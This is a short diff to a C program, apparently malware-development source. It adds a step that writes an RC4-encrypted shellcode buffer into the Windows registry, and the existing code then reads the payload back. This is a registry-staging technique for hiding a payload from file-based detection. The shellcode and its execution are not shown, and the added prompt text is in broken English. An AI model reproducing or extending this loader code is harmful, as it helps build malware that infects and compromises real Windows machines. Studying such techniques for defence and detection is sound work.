@@ -173,6 +173,14 @@ int main() {
     PVOID pBytes = NULL;
     SIZE_T sSize = NULL;
 
+    printf("[#] of do you Want Write Shellcode for Registry Press <Enter>");
+    getchar();
+
+    if (!WriteShellcodetoReg(Rc4CipherText, sizeof(Rc4CipherText))) {
+        return -1;
+    }
+
+
     printf("[i] Reading Shellcode ...");
     if (!readpayloadreg(&pBytes, &sSize)) {
         return -1;
